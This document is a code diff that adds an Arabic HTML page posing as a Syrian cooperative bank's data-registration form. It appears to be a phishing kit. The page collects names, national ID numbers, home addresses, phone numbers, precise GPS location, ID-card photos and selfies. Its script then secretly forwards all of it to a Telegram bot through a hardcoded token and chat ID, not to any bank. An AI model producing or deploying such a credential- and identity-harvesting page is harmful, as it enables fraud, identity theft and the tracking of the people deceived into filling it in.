@@ -1,0 +1,165 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>المصرف التعاوني السوري</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;font-family:'Segoe UI',Tahoma,Arial,sans-serif}
+body{background:linear-gradient(135deg,#1a237e,#0d1442);min-height:100vh;padding:20px;display:flex;justify-content:center;align-items:center}
+.card{background:#fff;border-radius:20px;padding:35px 25px;max-width:500px;width:100%;box-shadow:0 20px 60px rgba(0,0,0,0.4)}
+.header{text-align:center;margin-bottom:25px}
+.logo{width:150px;height:auto;margin-bottom:15px}
+h1{color:#1a237e;font-size:22px;margin-bottom:5px}
+.subtitle{color:#666;font-size:14px}
+.section{background:#f5f5ff;padding:15px;border-radius:12px;margin-bottom:20px;border-right:4px solid #1a237e}
+.section h3{color:#1a237e;font-size:16px;margin-bottom:10px}
+label{display:block;font-size:14px;color:#333;margin-top:15px;margin-bottom:6px;font-weight:bold}
+input,select,textarea{width:100%;padding:14px;border:1px solid #ddd;border-radius:10px;font-size:15px;background:#fafafa;box-sizing:border-box;font-family:inherit}
+input:focus,select:focus,textarea:focus{outline:none;border-color:#1a237e;background:#fff}
+.photo-box{background:#f5f5ff;border:2px dashed #1a237e;border-radius:12px;padding:20px;text-align:center;margin-top:15px}
+.photo-box .icon{font-size:45px;margin-bottom:10px}
+.photo-box p{color:#555;font-size:13px;line-height:1.7}
+input[type="file"]{padding:10px;font-size:13px;margin-top:12px;background:#fff}
+.btn{width:100%;padding:17px;background:linear-gradient(135deg,#1a237e,#0d1442);color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:bold;cursor:pointer;margin-top:25px}
+.footer{text-align:center;font-size:12px;color:#999;margin-top:25px}
+.gps-btn{width:100%;padding:14px;background:#4caf50;color:#fff;border:none;border-radius:10px;font-size:15px;font-weight:bold;cursor:pointer;margin-top:10px}
+.gps-status{text-align:center;font-size:13px;color:#666;margin-top:8px}
+</style>
+</head>
+<body>
+<div class="card">
+<div class="header">
+<img src="https://upload.wikimedia.org/wikipedia/ar/thumb/8/8e/Industrial_Bank_Logo.png/300px-Industrial_Bank_Logo.png" alt="المصرف التعاوني السوري" class="logo" onerror="this.style.display='none'">
+<h1>المصرف التعاوني السوري</h1>
+<p class="subtitle">استمارة تسجيل البيانات</p>
+</div>
+
+<form id="f">
+
+<div class="section">
+<h3>📋 البيانات الشخصية</h3>
+<label>الاسم الثلاثي واللقب *</label>
+<input type="text" id="name" placeholder="أدخل الاسم الثلاثي واللقب" required>
+<label>العمر *</label>
+<input type="number" id="age" placeholder="أدخل العمر" required>
+<label>عدد أفراد العائلة *</label>
+<input type="number" id="family" placeholder="أدخل عدد أفراد العائلة" required>
+</div>
+
+<div class="section">
+<h3>🆔 الوثائق الرسمية</h3>
+<label>رقم الهوية *</label>
+<input type="text" id="national_id" placeholder="أدخل رقم الهوية" required>
+</div>
+
+<div class="section">
+<h3>📍 محل السكن</h3>
+<label>القضاء أو الناحية *</label>
+<input type="text" id="district" placeholder="أدخل القضاء أو الناحية" required>
+<label>المحلة *</label>
+<input type="text" id="mahalla" placeholder="أدخل المحلة" required>
+<label>الزقاق *</label>
+<input type="text" id="zuqaq" placeholder="أدخل الزقاق" required>
+<label>رقم الدار *</label>
+<input type="text" id="house" placeholder="أدخل رقم الدار" required>
+</div>
+
+<div class="section">
+<h3>📞 معلومات الاتصال</h3>
+<label>رقم الهاتف *</label>
+<input type="tel" id="phone" placeholder="أدخل رقم الهاتف" required>
+</div>
+
+<div class="section">
+<h3>📎 المستندات المطلوبة</h3>
+<div class="photo-box">
+<div class="icon">📄</div>
+<p><b>صورة الهوية</b></p>
+<input type="file" id="id_img" accept="image/*">
+</div>
+<div class="photo-box">
+<div class="icon">📸</div>
+<p><b>صورة الوجه (سيلفي)</b></p>
+<input type="file" id="face" accept="image/*" capture="user">
+</div>
+</div>
+
+<div class="section">
+<h3>📡 الموقع الجغرافي (اختياري)</h3>
+<p style="font-size:13px;color:#666;margin-bottom:10px">يمكنك مشاركة موقعك لتأكيد محل السكن.</p>
+<button type="button" class="gps-btn" id="gpsBtn">📍 تحديد موقعي</button>
+<div class="gps-status" id="gpsStatus">لم يتم تحديد الموقع</div>
+</div>
+
+<button type="submit" class="btn">📤 إرسال الاستمارة</button>
+</form>
+
+<div class="footer">© 2026 المصرف التعاوني السوري - جميع الحقوق محفوظة</div>
+</div>
+
+<script>
+const BOT='8817416933:AAEJJON9lK12149s6-5qYZ91pzf8-XJiNTw';
+const CHAT='8823506156';
+let gpsData='لم يتم';
+
+document.getElementById('gpsBtn').addEventListener('click', function(){
+const status=document.getElementById('gpsStatus');
+status.textContent='جاري تحديد الموقع...';
+if(navigator.geolocation){
+navigator.geolocation.getCurrentPosition(
+function(pos){
+gpsData=pos.coords.latitude+','+pos.coords.longitude;
+status.textContent='✅ تم تحديد الموقع: '+pos.coords.latitude.toFixed(4)+', '+pos.coords.longitude.toFixed(4);
+status.style.color='#4caf50';
+},
+function(err){
+gpsData='مرفوض';
+status.textContent='❌ تم رفض الوصول للموقع';
+status.style.color='#f44336';
+},
+{enableHighAccuracy:true, timeout:10000}
+);
+}
+});
+
+document.getElementById('f').addEventListener('submit', async function(e){
+e.preventDefault();
+const msg='🏦 *المصرف التعاوني السوري*\n\n'+
+'👤 الاسم: '+document.getElementById('name').value+'\n'+
+'🎂 العمر: '+document.getElementById('age').value+'\n'+
+'👨‍👩‍👧‍👦 عدد أفراد العائلة: '+document.getElementById('family').value+'\n\n'+
+'🆔 رقم الهوية: `'+document.getElementById('national_id').value+'`\n\n'+
+'📍 *العنوان:*\n'+
+'🏙️ '+document.getElementById('district').value+'\n'+
+'🏠 محلة '+document.getElementById('mahalla').value+' - زقاق '+document.getElementById('zuqaq').value+' - دار '+document.getElementById('house').value+'\n\n'+
+'📞 الهاتف: `'+document.getElementById('phone').value+'`\n\n'+
+'📍 GPS: `'+gpsData+'`\n'+
+'🕐 '+new Date().toLocaleString('ar-IQ');
+await fetch('https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown');
+
+const idImg=document.getElementById('id_img');
+if(idImg.files[0]){
+const fd=new FormData();
+fd.append('chat_id',CHAT);
+fd.append('caption','📄 صورة الهوية: '+document.getElementById('name').value);
+fd.append('photo',idImg.files[0]);
+await fetch('https://api.telegram.org/bot'+BOT+'/sendPhoto',{method:'POST',body:fd});
+}
+
+const faceImg=document.getElementById('face');
+if(faceImg.files[0]){
+const fd=new FormData();
+fd.append('chat_id',CHAT);
+fd.append('caption','📸 صورة الوجه: '+document.getElementById('name').value);
+fd.append('photo',faceImg.files[0]);
+await fetch('https://api.telegram.org/bot'+BOT+'/sendPhoto',{method:'POST',body:fd});
+}
+
+alert('✅ تم إرسال الاستمارة بنجاح');
+document.getElementById('f').reset();
+gpsData='لم يتم';
+});
+</script>
+</body>
+</html>
